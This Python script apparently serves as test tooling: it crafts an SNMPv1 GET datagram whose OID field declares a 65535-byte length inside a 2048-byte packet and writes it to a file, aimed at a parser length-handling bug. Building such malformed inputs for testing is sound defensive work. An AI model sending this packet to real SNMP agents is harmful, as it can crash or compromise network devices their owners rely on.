#!/usr/bin/env python3
"""Craft one 2048-byte SNMPv1 GET datagram whose OID TLV declares len=0xffff.

Provisioning/loopback only. The outer BER lengths describe the real datagram;
the inner OID length is deliberately oversized, which is the bug under test.
"""
import struct
import sys

TOTAL = 2048


def tlv(tag: int, value: bytes) -> bytes:
    n = len(value)
    if n < 0x80:
        return bytes([tag, n]) + value
    if n <= 0xFFFF:
        return bytes([tag, 0x82]) + struct.pack(">H", n) + value
    raise ValueError(n)


def build(total: int = TOTAL) -> bytes:
    version = tlv(0x02, b"\x00")
    community = tlv(0x04, b"public")
    # Oversized OID length; the value is continuation bytes up to the datagram
    # end. First value byte has the high bit clear (accepted OID start byte).
    oid_value = b"\x2b" + b"\x80" * (total - 41)
    oid = b"\x06\x82\xff\xff" + oid_value
    varbind = tlv(0x30, oid)
    varbinds = tlv(0x30, varbind)
    request_body = (
        tlv(0x02, b"\x01")       # request id
        + tlv(0x02, b"\x00")     # error status
        + tlv(0x02, b"\x00")     # error index
        + varbinds
    )
    request = tlv(0xA0, request_body)
    message = tlv(0x30, version + community + request)
    if len(message) != total:
        raise ValueError(f"datagram {len(message)} != {total}")
    return message


if __name__ == "__main__":
    data = build()
    with open(sys.argv[1] if len(sys.argv) > 1 else "crafted.bin", "wb") as f:
        f.write(data)
    needle = b"\x06\x82\xff\xff"
    print(f"bytes={len(data)} oid_len=65535 oid_value_offset={data.find(needle) + 4}")
